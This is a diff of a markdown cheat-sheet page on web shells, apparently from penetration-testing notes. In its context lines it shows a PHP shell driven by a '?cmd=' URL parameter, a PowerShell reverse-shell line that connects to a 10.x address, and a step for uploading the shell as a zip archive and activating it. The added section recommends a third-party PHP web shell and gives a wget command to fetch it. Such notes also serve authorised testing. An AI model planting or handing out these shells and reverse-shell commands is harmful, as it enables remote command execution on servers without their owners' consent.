@@ -1,6 +1,6 @@
 title: Web Shells
 
-# Simple PHP
+# Basic PHP
 
 Simple PHP webshell, add `?cmd={command}` to the URL.
 
@@ -39,3 +39,13 @@ exec("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10
 ?>
 ```
 Save the above to a file, compress into a `.zip` archive and then upload & activate.
+
+# Simple-PHP-Web-Shell
+
+[Simple-PHP-Web-Shell](https://github.com/artyuum/Simple-PHP-Web-Shell) by [Artyumm](https://github.com/artyuum) is nice webshell that includes a command box and nicely formatted output
+
+```
+wget https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php
+```
+
+![](https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/screenshot.png)
